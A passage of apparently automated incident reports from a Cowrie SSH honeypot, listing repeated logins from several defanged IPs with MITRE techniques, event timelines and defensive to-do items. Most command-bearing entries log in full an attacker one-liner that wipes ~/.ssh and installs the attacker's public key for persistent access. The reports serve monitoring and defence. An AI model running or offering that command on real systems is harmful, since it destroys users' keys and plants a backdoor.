| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:03:38` | `cowrie.session.connect` |
| `2026-06-05 13:03:38` | `cowrie.client.version` |
| `2026-06-05 13:03:38` | `cowrie.client.kex` |
| `2026-06-05 13:03:39` | `cowrie.login.success` |
| `2026-06-05 13:03:39` | `cowrie.session.params` |
| `2026-06-05 13:03:39` | `cowrie.command.input` |
| `2026-06-05 13:03:39` | `cowrie.command.failed` |
| `2026-06-05 13:03:39` | `cowrie.log.closed` |
| `2026-06-05 13:03:39` | `cowrie.session.params` |
| `2026-06-05 13:03:39` | `cowrie.command.input` |
| `2026-06-05 13:03:39` | `cowrie.session.file_download` |
| `2026-06-05 13:03:39` | `cowrie.log.closed` |
| `2026-06-05 13:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55721523e4a2

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:03 |
| **Last Seen** | 2026-06-05 13:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:03:42` | `cowrie.session.connect` |
| `2026-06-05 13:03:42` | `cowrie.client.version` |
| `2026-06-05 13:03:42` | `cowrie.client.kex` |
| `2026-06-05 13:03:42` | `cowrie.login.success` |
| `2026-06-05 13:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4577a9803190

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:05 |
| **Last Seen** | 2026-06-05 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:05:35` | `cowrie.session.connect` |
| `2026-06-05 13:05:35` | `cowrie.client.version` |
| `2026-06-05 13:05:35` | `cowrie.client.kex` |
| `2026-06-05 13:05:36` | `cowrie.login.success` |
| `2026-06-05 13:05:36` | `cowrie.session.params` |
| `2026-06-05 13:05:36` | `cowrie.command.input` |
| `2026-06-05 13:05:36` | `cowrie.command.failed` |
| `2026-06-05 13:05:36` | `cowrie.log.closed` |
| `2026-06-05 13:05:37` | `cowrie.session.params` |
| `2026-06-05 13:05:37` | `cowrie.command.input` |
| `2026-06-05 13:05:37` | `cowrie.session.file_download` |
| `2026-06-05 13:05:37` | `cowrie.log.closed` |
| `2026-06-05 13:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35031193c39e

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:05 |
| **Last Seen** | 2026-06-05 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:05:39` | `cowrie.session.connect` |
| `2026-06-05 13:05:39` | `cowrie.client.version` |
| `2026-06-05 13:05:39` | `cowrie.client.kex` |
| `2026-06-05 13:05:39` | `cowrie.login.success` |
| `2026-06-05 13:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8827992dd0b9

| Field | Detail |
|---|---|
| **Source IP** | `103.54.101[.]216` |
| **First Seen** | 2026-06-05 13:08 |
| **Last Seen** | 2026-06-05 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:08:35` | `cowrie.session.connect` |
| `2026-06-05 13:08:35` | `cowrie.client.version` |
| `2026-06-05 13:08:35` | `cowrie.client.kex` |
| `2026-06-05 13:08:35` | `cowrie.login.success` |
| `2026-06-05 13:08:35` | `cowrie.session.params` |
| `2026-06-05 13:08:35` | `cowrie.command.input` |
| `2026-06-05 13:08:35` | `cowrie.command.failed` |
| `2026-06-05 13:08:35` | `cowrie.log.closed` |
| `2026-06-05 13:08:35` | `cowrie.session.params` |
| `2026-06-05 13:08:35` | `cowrie.command.input` |
| `2026-06-05 13:08:35` | `cowrie.session.file_download` |
| `2026-06-05 13:08:35` | `cowrie.log.closed` |
| `2026-06-05 13:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.54.101[.]216` to AbuseIPDB if not already reported
- [ ] Block `103.54.101[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88085a97f8df

| Field | Detail |
|---|---|
| **Source IP** | `103.54.101[.]216` |
| **First Seen** | 2026-06-05 13:08 |
| **Last Seen** | 2026-06-05 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:08:37` | `cowrie.session.connect` |
| `2026-06-05 13:08:37` | `cowrie.client.version` |
| `2026-06-05 13:08:37` | `cowrie.client.kex` |
| `2026-06-05 13:08:37` | `cowrie.login.success` |
| `2026-06-05 13:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.54.101[.]216` to AbuseIPDB if not already reported
- [ ] Block `103.54.101[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5000fd565243

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:11 |
| **Last Seen** | 2026-06-05 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:11:52` | `cowrie.session.connect` |
| `2026-06-05 13:11:52` | `cowrie.client.version` |
| `2026-06-05 13:11:52` | `cowrie.client.kex` |
| `2026-06-05 13:11:53` | `cowrie.login.success` |
| `2026-06-05 13:11:53` | `cowrie.session.params` |
| `2026-06-05 13:11:53` | `cowrie.command.input` |
| `2026-06-05 13:11:53` | `cowrie.command.failed` |
| `2026-06-05 13:11:54` | `cowrie.log.closed` |
| `2026-06-05 13:11:54` | `cowrie.session.params` |
| `2026-06-05 13:11:54` | `cowrie.command.input` |
| `2026-06-05 13:11:54` | `cowrie.session.file_download` |
| `2026-06-05 13:11:54` | `cowrie.log.closed` |
| `2026-06-05 13:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efb3c0402e2

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:11 |
| **Last Seen** | 2026-06-05 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:11:56` | `cowrie.session.connect` |
| `2026-06-05 13:11:56` | `cowrie.client.version` |
| `2026-06-05 13:11:56` | `cowrie.client.kex` |
| `2026-06-05 13:11:57` | `cowrie.login.success` |
| `2026-06-05 13:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc943469656b

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:15 |
| **Last Seen** | 2026-06-05 13:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:15:47` | `cowrie.session.connect` |
| `2026-06-05 13:15:47` | `cowrie.client.version` |
| `2026-06-05 13:15:47` | `cowrie.client.kex` |
| `2026-06-05 13:15:48` | `cowrie.login.success` |
| `2026-06-05 13:15:48` | `cowrie.session.params` |
| `2026-06-05 13:15:48` | `cowrie.command.input` |
| `2026-06-05 13:15:48` | `cowrie.command.failed` |
| `2026-06-05 13:15:48` | `cowrie.log.closed` |
| `2026-06-05 13:15:48` | `cowrie.session.params` |
| `2026-06-05 13:15:48` | `cowrie.command.input` |
| `2026-06-05 13:15:49` | `cowrie.session.file_download` |
| `2026-06-05 13:15:49` | `cowrie.log.closed` |
| `2026-06-05 13:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7731f41fccf2

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:15 |
| **Last Seen** | 2026-06-05 13:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:15:51` | `cowrie.session.connect` |
| `2026-06-05 13:15:51` | `cowrie.client.version` |
| `2026-06-05 13:15:51` | `cowrie.client.kex` |
| `2026-06-05 13:15:51` | `cowrie.login.success` |
| `2026-06-05 13:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df2870d6a92

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:18 |
| **Last Seen** | 2026-06-05 13:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:18:20` | `cowrie.session.connect` |
| `2026-06-05 13:18:20` | `cowrie.client.version` |
| `2026-06-05 13:18:20` | `cowrie.client.kex` |
| `2026-06-05 13:18:20` | `cowrie.login.success` |
| `2026-06-05 13:18:21` | `cowrie.session.params` |
| `2026-06-05 13:18:21` | `cowrie.command.input` |
| `2026-06-05 13:18:21` | `cowrie.command.failed` |
| `2026-06-05 13:18:21` | `cowrie.log.closed` |
| `2026-06-05 13:18:21` | `cowrie.session.params` |
| `2026-06-05 13:18:21` | `cowrie.command.input` |
| `2026-06-05 13:18:21` | `cowrie.session.file_download` |
| `2026-06-05 13:18:21` | `cowrie.log.closed` |
| `2026-06-05 13:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661c9de9822a

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:18 |
| **Last Seen** | 2026-06-05 13:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:18:23` | `cowrie.session.connect` |
| `2026-06-05 13:18:23` | `cowrie.client.version` |
| `2026-06-05 13:18:23` | `cowrie.client.kex` |
| `2026-06-05 13:18:24` | `cowrie.login.success` |
| `2026-06-05 13:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81fc0826bbe5

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:24 |
| **Last Seen** | 2026-06-05 13:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:24:06` | `cowrie.session.connect` |
| `2026-06-05 13:24:06` | `cowrie.client.version` |
| `2026-06-05 13:24:06` | `cowrie.client.kex` |
| `2026-06-05 13:24:06` | `cowrie.login.success` |
| `2026-06-05 13:24:07` | `cowrie.session.params` |
| `2026-06-05 13:24:07` | `cowrie.command.input` |
| `2026-06-05 13:24:07` | `cowrie.command.failed` |
| `2026-06-05 13:24:07` | `cowrie.log.closed` |
| `2026-06-05 13:24:07` | `cowrie.session.params` |
| `2026-06-05 13:24:07` | `cowrie.command.input` |
| `2026-06-05 13:24:07` | `cowrie.session.file_download` |
| `2026-06-05 13:24:07` | `cowrie.log.closed` |
| `2026-06-05 13:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b7c781f833

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:24 |
| **Last Seen** | 2026-06-05 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:24:09` | `cowrie.session.connect` |
| `2026-06-05 13:24:09` | `cowrie.client.version` |
| `2026-06-05 13:24:10` | `cowrie.client.kex` |
| `2026-06-05 13:24:10` | `cowrie.login.success` |
| `2026-06-05 13:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784fd61c663f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:38 |
| **Last Seen** | 2026-06-05 13:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:38:10` | `cowrie.session.connect` |
| `2026-06-05 13:38:10` | `cowrie.client.version` |
| `2026-06-05 13:38:10` | `cowrie.client.kex` |
| `2026-06-05 13:38:11` | `cowrie.login.success` |
| `2026-06-05 13:38:12` | `cowrie.session.params` |
| `2026-06-05 13:38:12` | `cowrie.command.input` |
| `2026-06-05 13:38:12` | `cowrie.command.failed` |
| `2026-06-05 13:38:12` | `cowrie.log.closed` |
| `2026-06-05 13:38:12` | `cowrie.session.params` |
| `2026-06-05 13:38:12` | `cowrie.command.input` |
| `2026-06-05 13:38:13` | `cowrie.session.file_download` |
| `2026-06-05 13:38:13` | `cowrie.log.closed` |
| `2026-06-05 13:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ef3449aeb4

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:38 |
| **Last Seen** | 2026-06-05 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:38:15` | `cowrie.session.connect` |
| `2026-06-05 13:38:15` | `cowrie.client.version` |
| `2026-06-05 13:38:15` | `cowrie.client.kex` |
| `2026-06-05 13:38:16` | `cowrie.login.success` |
| `2026-06-05 13:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.212[.]94` to AbuseIPDB if not already reported
- [ ] Block `81.30.212[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005c09ed7efa

| Field | Detail |
|---|---|
| **Source IP** | `81.30.212[.]94` |
| **First Seen** | 2026-06-05 13:39 |
| **Last Seen** | 2026-06-05 13:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:39:45` | `cowrie.session.connect` |
| `2026-06-05 13:39:45` | `cowrie.client.version` |
| `2026-06-05 13:39:45` | `cowrie.client.kex` |
| `2026-06-05 13:39:46` | `cowrie.login.success` |
| `2026-06-05 13:39:46` | `cowrie.session.params` |
| `2026-06-05 13:39:46` | `cowrie.command.input` |
